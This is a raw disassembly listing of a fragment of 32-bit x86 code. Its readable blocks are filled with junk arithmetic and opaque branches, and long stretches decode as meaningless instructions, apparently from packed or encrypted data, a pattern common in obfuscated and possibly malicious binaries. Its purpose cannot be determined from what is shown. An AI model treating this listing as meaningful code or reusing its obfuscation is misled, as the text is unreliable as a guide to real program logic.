  40b2ee:	sbb    BYTE PTR [edx+0x7ceb8cc0],al
  40b2f4:	push   cs
  40b2f5:	pop    ecx
  40b2f6:	mov    eax,ds:0x31aff262
  40b2fb:	add    BYTE PTR [esi-0x4ab8e70f],dh
  40b301:	jo     0x40b2f5
  40b303:	xchg   BYTE PTR [eax],dl
  40b305:	jp     0x40b2e9
  40b307:	jne    0x40b317
  40b309:	cmp    bh,BYTE PTR [edx-0x6b949c14]
  40b30f:	cmp    eax,0x95bdb593
  40b314:	push   eax
  40b315:	adc    DWORD PTR ds:0x4282ab,0x428263
  40b31f:	call   0x416c20
  40b324:	sbb    esi,DWORD PTR ds:0x428257
  40b32a:	mov    ecx,DWORD PTR [ebp-0x20]
  40b32d:	adc    esi,0x2986
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x4281eb,0x4282ab
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x428343,0x4282ab
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x42832b,0x42821f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x42835f,0x4281ff
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x42825f
  40b386:	adc    DWORD PTR ds:0x428153,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x4282c7,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x428233,0x42821f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x42812b,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x428347,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x428127,0x42835b
  40b3c4:	call   0x42202e
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x42822b
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x42825b,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x428243,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x4282db
  40b3f3:	mov    eax,ds:0x428253
  40b3f8:	cmp    DWORD PTR ds:0x42825b,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428e9c
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x42814b,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x42823b
  40b422:	or     DWORD PTR ds:0x4282cb,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x428127,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x428353,0x0
  40b441:	mov    DWORD PTR ds:0x4282cb,ecx
  40b447:	mov    DWORD PTR ds:0x42834b,0x318c
  40b451:	mov    DWORD PTR ds:0x42835b,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x428223,0x461b
  40b46a:	mov    DWORD PTR ds:0x42825f,0x63d9
  40b474:	cmp    DWORD PTR ds:0x428353,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428ea0
  40b48f:	xor    edx,DWORD PTR ds:0x428233
  40b495:	adc    ecx,DWORD PTR ds:0x42833b
  40b49b:	and    DWORD PTR ds:0x42812b,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x42823f
  40b4b7:	xor    DWORD PTR ds:0x428353,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x428223
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x42813f,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42811b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x4281eb,0x9f5
  40b501:	mov    DWORD PTR ds:0x428267,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x42813f,0x0
  40b512:	je     0x40b542
  40b518:	push   0x427f93
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428d88
  40b528:	sbb    DWORD PTR ds:0x428257,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x42818f
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x42837b
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x42815b
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428203
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x428233
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x428263,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x42833b,0x428203
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0xffffffdf
  40b596:	enter  0x7edd,0xa
  40b59a:	adc    ebx,DWORD PTR [eax]
  40b59c:	sbb    BYTE PTR [esi+0x12],ch
  40b59f:	sbb    BYTE PTR [eax],bl
  40b5a1:	popfw  
  40b5a3:	and    ecx,edi
  40b5a5:	mov    edx,0x3cd2b9d2
  40b5aa:	pop    esp
  40b5ab:	retf   0xef97
  40b5ae:	xchg   esi,eax
  40b5af:	push   esi
  40b5b0:	pop    es
  40b5b1:	mov    esi,0x64b1259d
  40b5b6:	cmp    cl,dl
  40b5b8:	mov    esp,0xe1a5ff42
  40b5bd:	jne    0x40b56b
  40b5bf:	aas    
  40b5c0:	das    
  40b5c1:	das    
  40b5c2:	clc    
  40b5c3:	mov    edi,0x8713268d
  40b5c8:	jp     0x40b5c0
  40b5ca:	pop    esp
  40b5cb:	ror    DWORD PTR [eax],cl
  40b5cd:	or     eax,0x4a2518a0
  40b5d2:	jae    0x40b567
  40b5d4:	xor    al,0xa2
  40b5d6:	test   edx,esp
  40b5d8:	mov    edi,0x5d9f5809
  40b5dd:	xor    dh,BYTE PTR [eax-0x70eff305]
  40b5e3:	in     al,0xb0
  40b5e5:	shl    DWORD PTR [ebx],cl
  40b5e7:	push   esi
  40b5e8:	xchg   ecx,eax
  40b5e9:	in     al,0x50
  40b5eb:	and    ecx,DWORD PTR [edx+edi*1-0x4b]
  40b5ef:	jo     0x40b5fc
  40b5f1:	int3   
  40b5f2:	sbb    eax,0x9318d1b8
  40b5f7:	xlat   BYTE PTR ds:[ebx]
  40b5f8:	dec    eax
  40b5f9:	mov    dh,0xa2
  40b5fb:	add    eax,0x5959bee7
  40b600:	(bad)  
  40b601:	pushf  
  40b602:	js     0x40b63f
  40b604:	xchg   esp,eax
  40b605:	data16 sub al,0x95
  40b608:	xor    al,0x6b
  40b60a:	xor    esi,DWORD PTR [edi+0xabdc8e0]
  40b610:	out    dx,al
  40b611:	daa    
  40b612:	jmp    0x40b672
  40b614:	gs pop ss
  40b616:	outs   dx,BYTE PTR ds:[esi]
  40b617:	adc    al,0x78
  40b619:	arpl   WORD PTR [eax+0x123c9710],si
  40b61f:	dec    ebp
  40b620:	aas    
  40b621:	push   edi
  40b622:	xchg   edi,eax
  40b623:	adc    eax,0x36a3eab5
  40b628:	xchg   ebp,eax
  40b629:	xor    edi,DWORD PTR [ecx-0x19846370]
  40b62f:	jle    0x40b5de
  40b631:	xchg   esp,eax
  40b632:	sbb    ecx,DWORD PTR [ebp-0x3dcde982]
  40b638:	sub    eax,0x83545de3
  40b63d:	das    
  40b63e:	jge    0x40b62b
  40b640:	test   eax,0x910f80bb
  40b645:	dec    ebx
  40b646:	mov    edx,DWORD PTR [edi+0x5a646595]
  40b64c:	xchg   edi,eax
  40b64d:	mov    ebx,0x8a04f540
  40b652:	ins    BYTE PTR es:[edi],dx
  40b653:	and    al,0x19
  40b655:	sbb    DWORD PTR [ebx-0x76],esp
  40b658:	dec    ebp
  40b659:	in     al,dx
  40b65a:	shl    DWORD PTR [edx+esi*4],cl
  40b65d:	jne    0x40b620
  40b65f:	adc    ah,BYTE PTR [eax]
  40b661:	test   BYTE PTR [edx],cl
  40b663:	loopne 0x40b63d
  40b665:	push   ecx
  40b666:	loopne 0x40b6b4
  40b668:	in     al,dx
  40b669:	(bad)  
  40b66a:	call   0x1b65:0xd43a5cef
  40b671:	bound  edx,QWORD PTR [ebx]
  40b673:	push   0xd9f6f655
  40b678:	sbb    eax,0x5f806e05
  40b67d:	ins    DWORD PTR es:[edi],dx
  40b67e:	std    
  40b67f:	cmp    eax,DWORD PTR [ebp+edi*8+0x4253a1d9]
  40b686:	xlat   BYTE PTR ds:[ebx]
  40b687:	push   ebp
  40b688:	xor    BYTE PTR [ecx+ecx*1-0x38],al
  40b68c:	jp     0x40b705
  40b68e:	xlat   BYTE PTR ds:[ebx]
  40b68f:	gs jae 0x40b638
  40b692:	ret    0x6921
  40b695:	imul   ebx,DWORD PTR [esi+edx*2+0x777c845b],0xbc03baa1
  40b6a0:	test   esi,0x56f24cdc
  40b6a6:	mov    dl,0x8f
  40b6a8:	jg     0x40b6ef
  40b6aa:	out    0xa6,al
  40b6ac:	call   0xf63451f9
  40b6b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6b2:	sub    ebp,edi
  40b6b4:	mov    esp,0x1ee48b04
  40b6b9:	cmp    BYTE PTR [eax+0x64],al
  40b6bc:	inc    esi
  40b6bd:	cmp    ebp,ebx
  40b6bf:	test   DWORD PTR [esi],edi
  40b6c1:	sub    al,0x23
  40b6c3:	cmp    al,0x2a
  40b6c5:	xchg   DWORD PTR [bx],edx
  40b6c8:	ret    
  40b6c9:	jmp    0x994:0x23c4b313
  40b6d0:	inc    esi
  40b6d1:	rcl    DWORD PTR [edx-0x7b0eadba],0x6
  40b6d8:	mov    al,0x7e
  40b6da:	not    cl
  40b6dc:	outs   dx,DWORD PTR ds:[esi]
  40b6dd:	xor    eax,0x110f58c6
  40b6e2:	or     eax,0x1f79ec53
  40b6e7:	and    DWORD PTR [edi],edi
  40b6e9:	ret    
  40b6ea:	mov    cl,0xb
  40b6ec:	push   ebx
  40b6ed:	jne    0x40b6c8
  40b6ef:	cwde   
  40b6f0:	pop    es
  40b6f1:	xlat   BYTE PTR ds:[ebx]
  40b6f2:	mov    esp,0xdfb67ff0
  40b6f7:	cmc    
  40b6f8:	xor    BYTE PTR [eax-0x374a9d34],cl
  40b6fe:	nop
  40b6ff:	cmp    bl,BYTE PTR [ebx+0x319c0a]
  40b705:	in     al,dx
  40b706:	pop    edi
  40b707:	in     eax,dx
  40b708:	jecxz  0x40b73a
  40b70a:	sub    esp,DWORD PTR [edi-0x42585def]
  40b710:	mov    ch,0x7f
  40b712:	mov    al,ds:0xcbf582c
  40b717:	or     al,BYTE PTR [edi]
  40b719:	dec    esi
  40b71a:	xchg   ecx,eax
  40b71b:	or     BYTE PTR [esi+ebp*4-0x1e],cl
  40b71f:	ins    DWORD PTR es:[edi],dx
  40b720:	ret    0x8da9
  40b723:	mov    ds:0xf24edab5,al
  40b728:	mov    cl,0x6f
  40b72a:	push   eax
  40b72b:	pop    edi
  40b72c:	pop    esp
  40b72d:	jp     0x40b77a
  40b72f:	je     0x40b6db
  40b731:	aam    0xb4
  40b733:	popf   
  40b734:	add    al,0x49
  40b736:	inc    esi
  40b737:	sub    DWORD PTR [ebp+ecx*1-0xe],0xffffff84
  40b73c:	mov    bh,0xdb
  40b73e:	xor    al,BYTE PTR [ebx-0x7d]
  40b741:	aad    0xe2
  40b743:	xchg   BYTE PTR [ebx],dh
  40b745:	sub    DWORD PTR [ebx],esp
  40b747:	mov    eax,0x55840cd6
  40b74c:	jl     0x40b72f
  40b74e:	mov    fs,edi
  40b750:	xchg   ebp,eax
  40b751:	sar    DWORD PTR [edi-0x3d5bc80f],cl
  40b757:	mov    bh,0x14
  40b759:	test   BYTE PTR [edi-0x41],0x9b
  40b75d:	popf   
  40b75e:	mov    ebp,gs
  40b760:	pop    esi
  40b761:	push   ebp
  40b762:	mov    ds:0xd1007bdc,al
  40b767:	pop    ss
  40b768:	lods   al,BYTE PTR ds:[esi]
  40b769:	ret    
  40b76a:	dec    edx
  40b76b:	sbb    ch,BYTE PTR [eax+edx*4-0x26]
  40b76f:	xchg   edx,eax
  40b770:	std    
  40b771:	mov    cl,0x6e
  40b773:	call   0xf0d4ae69
  40b778:	fiadd  WORD PTR [eax-0x1d]
  40b77b:	imul   esp,DWORD PTR [ecx],0x67ea490b
  40b781:	mov    eax,0x944c61c5
  40b786:	arpl   WORD PTR [ebx-0x2127311c],dx
  40b78c:	sbb    DWORD PTR [edx],0x31
  40b78f:	cmp    ebx,eax
  40b791:	jbe    0x40b7b7
  40b793:	lods   eax,DWORD PTR ds:[esi]
  40b794:	lock sbb eax,0x1c03496d
  40b79a:	sub    al,0xf3
  40b79c:	(bad)  
  40b79d:	popa   
  40b79e:	or     al,0xcd
  40b7a0:	ins    DWORD PTR es:[edi],dx
  40b7a1:	inc    ebx
  40b7a2:	in     al,dx
  40b7a3:	out    dx,eax
  40b7a4:	int3   
  40b7a5:	es dec ebp
  40b7a7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40b7a9:	mov    esp,0x82655efc
  40b7ae:	inc    ebp
  40b7af:	(bad)  
  40b7b0:	sbb    DWORD PTR [eax],esp
  40b7b2:	cmp    eax,0xf9f87e5c
  40b7b7:	adc    BYTE PTR [eax],0xc5
  40b7ba:	cwde   
  40b7bb:	or     ecx,ebp
  40b7bd:	shl    BYTE PTR [eax+eax*8-0x77233a28],1
  40b7c4:	mov    ss,WORD PTR [ebx-0x484693ff]
  40b7ca:	jbe    0x40b761
  40b7cc:	stos   BYTE PTR es:[edi],al
  40b7cd:	push   edi
  40b7ce:	xor    al,0xc2
  40b7d0:	fcom   st(7)
  40b7d2:	cli    
  40b7d3:	emms   
  40b7d5:	sub    BYTE PTR [esi+eiz*1],ch
  40b7d8:	push   edi
  40b7d9:	call   0x599b:0x38ba53af
  40b7e0:	inc    ebx
  40b7e1:	rcl    al,cl
  40b7e3:	sbb    eax,0xc6c0843a
  40b7e8:	jmp    0x3fea:0x37ec44b5
  40b7ef:	ret    0xcb4d
  40b7f2:	hlt    
  40b7f3:	sub    BYTE PTR ds:0x2f352078,al
  40b7f9:	push   ss
  40b7fa:	and    esp,DWORD PTR [ecx]
  40b7fc:	inc    ebp
  40b7fd:	pop    eax
  40b7fe:	and    DWORD PTR [edx],0x85025ee
  40b804:	or     DWORD PTR [edx-0x1a47cdd4],ebp
  40b80a:	ror    BYTE PTR [edi+eax*4+0x67912cd2],0x18
  40b812:	sbb    edi,DWORD PTR [ebp-0x51a52a08]
  40b818:	(bad)  
  40b81a:	popa   
  40b81b:	inc    edi
  40b81c:	imul   ecx,edx,0x6b
  40b81f:	fwait
  40b820:	stos   DWORD PTR es:[edi],eax
  40b821:	mov    ds:0xa9f71c5c,eax
  40b826:	dec    eax
  40b827:	loope  0x40b851
  40b829:	out    0x6e,al
  40b82b:	(bad)  
  40b82c:	pop    ds
  40b82d:	out    0xef,al
  40b82f:	jnp    0x40b7d2
  40b831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b832:	pop    ebp
  40b833:	sbb    cl,dh
  40b835:	jge    0x40b89c
  40b837:	dec    ecx
  40b838:	mov    edi,0x1d6416ae
  40b83d:	mov    al,ds:0x1edb9895
  40b842:	inc    esi
  40b843:	jp     0x40b86f
  40b845:	adc    al,0x9
  40b847:	push   edi
  40b848:	sub    ebp,DWORD PTR [ebx-0x5a]
  40b84b:	sub    ch,0xdc
  40b84e:	pop    ebx
  40b84f:	js     0x40b817
  40b851:	lea    esi,[edx+0x24]
  40b854:	sub    al,0x50
  40b856:	daa    
  40b857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b858:	sbb    al,0xf3
  40b85a:	sub    edi,0xc2323714
  40b860:	ja     0x40b882
  40b862:	sub    edx,DWORD PTR ds:0x4125cef3
  40b868:	es bnd jmp 0x40b843
  40b86c:	cmp    eax,0x45c9df2e
  40b871:	adc    eax,0xd55cc9d9
  40b876:	mov    ch,0x1c
  40b878:	bound  esp,QWORD PTR [ebp-0xea80564]
  40b87e:	dec    edx
  40b87f:	out    dx,eax
  40b880:	outs   dx,DWORD PTR ds:[esi]
  40b881:	jnp    0x40b8c6
  40b883:	stc    
  40b884:	(bad)  
  40b885:	neg    DWORD PTR [edi+0x7f9d55df]
  40b88b:	jno    0x40b80f
  40b88d:	cmp    al,0x94
  40b88f:	hlt    
  40b890:	mov    edi,0x60144799
  40b895:	dec    esp
  40b896:	fs xor al,0x95
  40b899:	jmp    0xb3b:0xc2c50b5f
  40b8a0:	add    BYTE PTR [edx],0xa0
  40b8a3:	or     bl,BYTE PTR es:[edi-0x1ad26469]
  40b8aa:	cli    
  40b8ab:	push   eax
  40b8ac:	(bad)  
  40b8ad:	xor    BYTE PTR [eax-0x3d],cl
  40b8b0:	adc    edi,DWORD PTR ds:0x4a6ec571
  40b8b6:	imul   edx,DWORD PTR [ebx-0x28f3f861],0x98bedd87
  40b8c0:	dec    ecx
  40b8c1:	popf   
  40b8c2:	xchg   edi,eax
  40b8c3:	and    DWORD PTR [eax],ecx
  40b8c5:	addr16 out 0xa3,al
  40b8c8:	xor    al,0x5c
  40b8ca:	xchg   ebx,eax
  40b8cb:	fld    DWORD PTR [ecx-0x19]
  40b8ce:	out    0xc2,al
  40b8d0:	stc    
  40b8d1:	loopne 0x40b8d6
  40b8d3:	ins    DWORD PTR es:[edi],dx
  40b8d4:	dec    edi
  40b8d5:	adc    bl,BYTE PTR [ebx+0x69]
  40b8d8:	jecxz  0x40b8da
  40b8da:	je     0x40b875
  40b8dc:	dec    ecx
  40b8dd:	push   0x9fc39c1a
  40b8e2:	push   eax
  40b8e3:	mov    ecx,0xb755aee4
  40b8e8:	sti    
  40b8e9:	pop    edi
  40b8ea:	cmp    eax,0x583f2f48
  40b8ef:	hlt    
  40b8f0:	mov    ch,0x3f
  40b8f2:	ret    0x489a
  40b8f5:	cmp    al,0xab
  40b8f7:	and    ebp,ebp
  40b8f9:	std    
  40b8fa:	cmp    bl,bl
  40b8fc:	daa    
  40b8fd:	ror    DWORD PTR [ecx-0x7de1cd3e],1
  40b903:	dec    esi
  40b904:	or     ah,cl
  40b906:	pop    eax
  40b907:	repz test DWORD PTR [edx-0x70],esi
  40b90b:	out    dx,eax
  40b90c:	mov    ss,WORD PTR [esi-0x6c]
  40b90f:	mov    esi,0x3606224d
  40b914:	mov    ds:0xc2c0de8f,eax
  40b919:	leave  
  40b91a:	mov    BYTE PTR [ebx-0x40],bh
  40b91d:	mov    al,0xb4
  40b91f:	lahf   
  40b920:	and    DWORD PTR [edi+edi*2],0x2734966b
  40b927:	push   ds
  40b928:	xor    eax,0x9d566f83
  40b92d:	mov    al,0xc
  40b92f:	pushf  
  40b930:	je     0x40b8d8
  40b932:	icebp  
  40b933:	pop    edi
  40b934:	cmp    BYTE PTR [ebx-0xc1324ee],bl
  40b93a:	mov    al,ds:0xddf61be3
  40b93f:	inc    edi
  40b940:	stos   BYTE PTR es:[edi],al
  40b941:	cmc    
  40b942:	ja     0x40b8c4
  40b944:	call   0x6283:0x8fa545a8
  40b94b:	(bad)  
  40b94d:	xchg   cx,ax
  40b94f:	arpl   WORD PTR [ecx],ax
  40b951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b952:	loop   0x40b92e
  40b954:	inc    ebp
  40b955:	fidiv  WORD PTR [eax]
  40b957:	fcmove st,st(0)
  40b959:	adc    ebp,esi
  40b95b:	(bad)  
  40b95d:	pop    ecx
  40b95e:	(bad)  
  40b95f:	retf   
  40b960:	nop
  40b961:	push   edi
  40b962:	push   edx
  40b963:	sbb    esp,DWORD PTR [esi+0x7d]
  40b966:	test   eax,0x1ee7adf
  40b96b:	hlt    
  40b96c:	(bad)  
  40b96d:	inc    edi
  40b96e:	sbb    al,0xc3
  40b970:	(bad)  
  40b971:	or     DWORD PTR [ebx],edi
  40b973:	mov    bh,ah
  40b975:	and    esp,ebx
  40b977:	ret    
  40b978:	sub    al,cl
  40b97a:	add    eax,0x355c
  40b97f:	adc    ecx,0x819
  40b985:	adc    DWORD PTR ds:0x4282b3,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x428237
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x4282c7,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x4282cf,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x428237,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x4282cf,0x2492
  40b9d2:	mov    DWORD PTR ds:0x42835f,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x4282cf,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428d8c
  40b9f7:	adc    DWORD PTR ds:0x42835b,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x4282b7
  40ba0a:	sub    edx,DWORD PTR ds:0x4282cb
  40ba10:	mov    DWORD PTR ds:0x4282b7,edx
  40ba16:	adc    DWORD PTR ds:0x4282b3,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x428127
  40ba26:	xor    DWORD PTR ds:0x428353,edx
  40ba2c:	or     DWORD PTR ds:0x4281ff,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x428237
  40ba3c:	or     DWORD PTR ds:0x4282d3,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	stos   DWORD PTR es:[edi],eax
  40baa4:	mov    al,0x53
  40baa6:	stos   BYTE PTR es:[edi],al
  40baa7:	pusha  
  40baa8:	or     eax,0x126e1818
  40baad:	sbb    BYTE PTR [eax],bl
  40baaf:	cmp    DWORD PTR [ebp+0x9],edi
  40bab2:	daa    
  40bab3:	pushf  
  40bab4:	mov    esi,0xf5bde747
  40bab9:	outs   dx,DWORD PTR ds:[esi]
  40baba:	or     cl,BYTE PTR [ecx-0x3f]
  40babd:	pop    edi
  40babe:	inc    edi
  40babf:	fdiv   DWORD PTR [ebp+eax*4+0x1a]
  40bac3:	repnz dec esi
  40bac5:	push   0x2c
  40bac7:	std    
  40bac8:	jno    0x40bafe
  40baca:	or     bh,dl
  40bacc:	push   ebx
  40bacd:	(bad)  
  40bace:	jae    0x40badf
  40bad0:	popf   
  40bad1:	mov    WORD PTR [edx+0x5d],ds
  40bad4:	sub    esi,edx
  40bad6:	loope  0x40bb1e
  40bad8:	push   eax
  40bad9:	lock and al,0x0
  40badc:	xlat   BYTE PTR ds:[ebx]
  40badd:	outs   dx,DWORD PTR ds:[esi]
  40bade:	pop    ebx
  40badf:	jp     0x40ba62
  40bae1:	xchg   ebx,eax
  40bae2:	xor    dl,dl
  40bae4:	mov    ds:0x4953013a,eax
  40bae9:	loopne 0x40bb59
  40baeb:	xor    al,0x28
  40baed:	popf   
  40baee:	in     eax,dx
  40baef:	sub    DWORD PTR [edx],edi
  40baf1:	jp     0x40bb45
  40baf3:	cdq    
  40baf4:	inc    eax
  40baf5:	call   0x4570f664
  40bafa:	pop    es
  40bafb:	pop    ecx
  40bafc:	mov    al,ds:0xbb8abea5
  40bb01:	pop    esp
  40bb02:	xchg   esp,eax
  40bb03:	mov    WORD PTR [edx],cs
  40bb05:	ins    BYTE PTR es:[edi],dx
  40bb06:	sub    al,0xda
  40bb08:	or     eax,0x32968d09
  40bb0d:	push   edi
  40bb0e:	arpl   WORD PTR [edx+0x52],cx
  40bb11:	xor    edi,ecx
  40bb13:	or     BYTE PTR [eax],ah
  40bb15:	call   0xadfe9388
  40bb1a:	xor    al,0xff
  40bb1c:	mov    ebx,0xe66b85fe
  40bb21:	out    0xef,eax
  40bb23:	mov    gs,WORD PTR [esi+eiz*8-0x4d]
  40bb27:	daa    
  40bb28:	inc    edx
  40bb29:	xchg   esp,eax
  40bb2a:	xor    BYTE PTR [esi-0x32148297],al
  40bb30:	ror    BYTE PTR [esi],1
  40bb32:	dec    edx
  40bb33:	jmp    0x40bad0
  40bb35:	fsub   QWORD PTR ds:0xa00d5c04
  40bb3b:	jecxz  0x40bb09
  40bb3d:	pop    esi
  40bb3e:	cmp    DWORD PTR [ebp-0x49],edx
  40bb41:	dec    ebx
  40bb42:	fisubr DWORD PTR [ebp-0x3c04d794]
  40bb48:	cs ins DWORD PTR es:[edi],dx
  40bb4a:	pop    ss
  40bb4b:	and    ah,BYTE PTR [edx-0x6989f777]
  40bb51:	dec    esi
  40bb52:	fild   QWORD PTR [esi-0x13]
  40bb55:	mov    edi,gs
  40bb57:	sbb    eax,0xd1574484
  40bb5c:	out    0x57,eax
  40bb5e:	aad    0xfb
  40bb60:	popf   
  40bb61:	rcr    BYTE PTR [edx+eiz*8],cl
  40bb64:	mov    esp,ss
  40bb66:	cmp    BYTE PTR [eax+ecx*1],0xbe
  40bb6a:	pop    esi
  40bb6b:	adc    BYTE PTR [ebp-0x3b],0x64
  40bb6f:	scas   al,BYTE PTR es:[edi]
  40bb70:	jae    0x40bbac
  40bb72:	into   
  40bb73:	sbb    eax,0x79f2d907
  40bb78:	sbb    dl,BYTE PTR [edi+0xa68ffa]
  40bb7e:	lods   eax,DWORD PTR ds:[esi]
  40bb7f:	xor    al,0xa9
  40bb81:	cmp    al,0x0
  40bb83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb84:	clc    
  40bb85:	pop    edi
  40bb86:	sbb    eax,0x6ff299da
  40bb8b:	sbb    ebp,DWORD PTR [edx+0x6c5e4c56]
  40bb91:	sbb    ebp,ecx
  40bb93:	dec    esp
  40bb94:	xchg   ebx,eax
  40bb95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb96:	outs   dx,BYTE PTR ds:[esi]
  40bb97:	add    al,0x56
  40bb99:	shr    BYTE PTR [edx-0x5ab8cce7],1
  40bb9f:	pop    esp
  40bba0:	ror    BYTE PTR [edx+0x6b],1
  40bba3:	fld    TBYTE PTR [ebx]
  40bba5:	adc    al,0x3d
  40bba7:	shl    DWORD PTR [edx+0x2fa3fbcd],1
  40bbad:	sub    BYTE PTR [edx+edx*2],dh
  40bbb0:	enter  0xf5e,0xa5
  40bbb4:	push   eax
  40bbb5:	test   al,0x9e
  40bbb7:	daa    
  40bbb8:	sbb    edi,ecx
  40bbba:	mov    bl,0xf1
  40bbbc:	dec    eax
  40bbbd:	(bad)  
  40bbbe:	mov    eax,0x3ea213ea
  40bbc3:	dec    ecx
  40bbc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbc5:	das    
  40bbc6:	hlt    
  40bbc7:	popf   
  40bbc8:	or     eax,0xfa909dbf
  40bbcd:	ss clc 
  40bbcf:	push   eax
  40bbd0:	arpl   WORD PTR [edi-0x27],si
  40bbd3:	fs aaa 
  40bbd5:	mov    ah,0xed
  40bbd7:	pushf  
  40bbd8:	in     al,0x4a
  40bbda:	xor    al,BYTE PTR [esi]
